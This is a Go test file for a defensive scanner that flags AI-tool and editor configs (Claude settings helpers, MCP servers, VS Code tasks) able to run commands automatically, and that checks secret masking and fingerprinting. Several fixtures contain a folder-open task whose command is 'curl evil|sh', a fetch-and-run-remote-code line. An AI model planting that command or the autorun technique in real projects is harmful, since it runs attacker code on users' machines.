package autorun

import (
	"context"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
	"testing"

	aidefensekit "github.com/iimmuunnee/ai-defense-kit"
	"github.com/iimmuunnee/ai-defense-kit/internal/checker"
	"github.com/iimmuunnee/ai-defense-kit/internal/finding"
)

func TestSettingsHelpersAreReported(t *testing.T) {
	cases := []struct{ name, rel, body, want string }{
		{"apiKeyHelper", ".claude/settings.json", `{"apiKeyHelper":"./get-key.sh"}`,
			`.claude/settings.json|0|apiKeyHelper: ./get-key.sh`},
		{"statusLine", ".claude/settings.json", `{"statusLine":{"type":"command","command":"./bar.sh"}}`,
			`.claude/settings.json|0|statusLine: {"command":"./bar.sh","type":"command"}`},
		{"other documented helper", ".claude/settings.json", `{"otelHeadersHelper":"./otel.sh"}`,
			`.claude/settings.json|0|otelHeadersHelper: ./otel.sh`},
		{"local settings hook", ".claude/settings.local.json", `{"hooks":{"Stop":[{"hooks":[{"type":"command","command":"./h.sh"}]}]}}`,
			`.claude/settings.local.json|0|Stop: {"command":"./h.sh","type":"command"}`},
		{"local settings helper", ".claude/settings.local.json", `{"apiKeyHelper":"./get-key.sh"}`,
			`.claude/settings.local.json|0|apiKeyHelper: ./get-key.sh`},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			root := t.TempDir()
			write(t, root, c.rel, c.body)
			expectFindings(t, root, "AR-004|medium|suspect|"+c.want)
		})
	}
	t.Run("empty helper", func(t *testing.T) {
		root := t.TempDir()
		write(t, root, ".claude/settings.json", `{"apiKeyHelper":"  ","statusLine":{}}`)
		expectFindings(t, root)
	})
}

func TestMCPServersWithoutCommandAreReported(t *testing.T) {
	cases := []struct{ name, rel, body, want string }{
		{"url and headersHelper", ".mcp.json",
			`{"mcpServers":{"s":{"url":"https://mcp.example.test/x","headersHelper":"./h.sh","headers":{"Authorization":"Bearer abc"}}}}`,
			`.mcp.json|0|s: {"headersHelper":"./h.sh","url":"https://mcp.example.test/x","headers":{"Authorization":"****"}}`},
		{"url only", ".cursor/mcp.json", `{"mcpServers":{"s":{"url":"https://mcp.example.test/x"}}}`,
			`.cursor/mcp.json|0|s: {"url":"https://mcp.example.test/x"}`},
		{"headersHelper only", ".mcp.json", `{"mcpServers":{"s":{"headersHelper":"./h.sh"}}}`,
			`.mcp.json|0|s: {"headersHelper":"./h.sh"}`},
		{"vscode servers", ".vscode/mcp.json", `{"servers":{"s":{"type":"stdio","command":"npx","args":["x"]}}}`,
			`.vscode/mcp.json|0|s: {"command":"npx","args":["x"],"type":"stdio"}`},
		{"vscode remote server", ".vscode/mcp.json", `{"servers":{"s":{"type":"http","url":"https://mcp.example.test/x"}}}`,
			`.vscode/mcp.json|0|s: {"url":"https://mcp.example.test/x","type":"http"}`},
		{"vscode mcpServers", ".vscode/mcp.json", `{"mcpServers":{"s":{"command":"npx"}}}`,
			`.vscode/mcp.json|0|s: {"command":"npx"}`},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			root := t.TempDir()
			write(t, root, c.rel, c.body)
			expectFindings(t, root, "AR-004|medium|suspect|"+c.want)
		})
	}
	t.Run("a server with neither", func(t *testing.T) {
		root := t.TempDir()
		write(t, root, ".vscode/mcp.json", `{"servers":{"s":{"type":"stdio"}}}`)
		expectFindings(t, root)
	})
	t.Run("the same name under both keys", func(t *testing.T) {
		root := t.TempDir()
		write(t, root, ".vscode/mcp.json", `{"servers":{"s":{"command":"a"}},"mcpServers":{"s":{"command":"b"}}}`)
		if res := run(t, root); len(res.Findings) != 2 {
			t.Errorf("findings = %+v", res.Findings)
		}
	})
}

// Reporting more servers does not change the fingerprint of the ones reported
// before, which a .adkignore may already list.
func TestFingerprintOfAServerWithACommandIsUnchanged(t *testing.T) {
	root := t.TempDir()
	write(t, root, ".mcp.json", `{"mcpServers":{"helper":{"command":"echo","args":["adk-test"]}}}`)
	f := run(t, root).Findings[0]
	want := finding.MakeMaskedFingerprint("AR-004", ".mcp.json", f.Evidence, 0)
	if f.Fingerprint != want {
		t.Errorf("fingerprint = %s, want %s", f.Fingerprint, want)
	}
}

// A value in args is part of the file, not of the fingerprint: two configs that
// differ only in that value give one fingerprint, so a guess of the value cannot
// be checked against it. The values are plain words put together here.
func TestAutorunFingerprintIgnoresArgumentValue(t *testing.T) {
	fp := func(word string) string {
		root := t.TempDir()
		// The padding pushes the value past what the evidence shows.
		pad := strings.Repeat("x", 6000)
		write(t, root, ".mcp.json", `{"mcpServers":{"helper":{"command":"echo","args":["--password","`+pad+word+`"]}}}`)
		res := run(t, root)
		if len(res.Findings) != 1 {
			t.Fatalf("findings = %+v", res.Findings)
		}
		if strings.Contains(res.Findings[0].Evidence, word) {
			t.Fatalf("evidence shows the value %q", word)
		}
		return res.Findings[0].Fingerprint
	}
	if fp("sun"+"flower") != fp("um"+"brella") {
		t.Error("fingerprint depends on an argument value")
	}
}

func TestExplainSaysWhereAutomaticRunningIsUnconfirmed(t *testing.T) {
	root := t.TempDir()
	write(t, root, ".claude/settings.json", `{"statusLine":{"type":"command","command":"./bar.sh"}}`)
	res, err := New(aidefensekit.Data).Run(context.Background(), checker.Target{Root: root})
	if err != nil {
		t.Fatal(err)
	}
	if len(res.Findings) != 1 || !strings.Contains(res.Findings[0].ExplainKo, "자동 실행 여부 확인 필요") {
		t.Errorf("findings = %+v", res.Findings)
	}
}

// Decoy keys and a long argument cannot push what runs out of the window.
func TestWhatRunsComesFirst(t *testing.T) {
	var decoys strings.Builder
	for i := 0; i < 12; i++ {
		decoys.WriteString(`"` + strings.Repeat(string(rune('a'+i)), 120) + `":"` + strings.Repeat("z", 120) + `",`)
	}
	longArg := strings.Repeat("y", 1200)
	cut := strings.Repeat("y", 300) + cutInJSON

	root := t.TempDir()
	write(t, root, ".vscode/tasks.json", `{"tasks":[{`+decoys.String()+`"label":"t","command":"curl evil|sh","args":["`+longArg+`","after"],`+folderOpen+`}]}`)
	ev := strings.Join(summarize(run(t, root).Findings), "|")
	if want := `t: {"command":"curl evil|sh","args":["` + cut + `","after"],"`; !strings.Contains(ev, want) {
		t.Errorf("evidence = %s\nwant prefix %s", ev, want)
	}

	root = t.TempDir()
	write(t, root, ".mcp.json", `{"mcpServers":{"s":{`+decoys.String()+`"url":"https://mcp.example.test/x","headersHelper":"./h.sh"}}}`)
	ev = strings.Join(summarize(run(t, root).Findings), "|")
	if want := `s: {"headersHelper":"./h.sh","url":"https://mcp.example.test/x","`; !strings.Contains(ev, want) {
		t.Errorf("evidence = %s", ev)
	}

	root = t.TempDir()
	write(t, root, ".vscode/tasks.json", `{"tasks":[{`+decoys.String()+`"linux":{"command":"curl evil|sh"},"label":"t",`+folderOpen+`}]}`)
	ev = strings.Join(summarize(run(t, root).Findings), "|")
	if want := `t: {"linux":{"command":"curl evil|sh"},"`; !strings.Contains(ev, want) {
		t.Errorf("evidence = %s", ev)
	}
}

// A Windows junction at a config directory is read as neither a folder nor a
// file, so it is reported like a link.
func TestJunctionAtConfigDirIsReported(t *testing.T) {
	if runtime.GOOS != "windows" {
		t.Skip("junctions are a Windows feature")
	}
	root := t.TempDir()
	target := t.TempDir()
	write(t, target, "tasks.json", `{"tasks":[{"command":"x",`+folderOpen+`}]}`)
	if out, err := exec.Command("cmd", "/c", "mklink", "/J", filepath.Join(root, ".vscode"), target).CombinedOutput(); err != nil {
		t.Skipf("mklink: %v: %s", err, out)
	}
	res := run(t, root)
	if len(res.Findings) != 1 || res.Findings[0].ID != "AR-001" || res.Findings[0].Evidence != unreadable {
		t.Errorf("findings = %+v", res.Findings)
	}
}
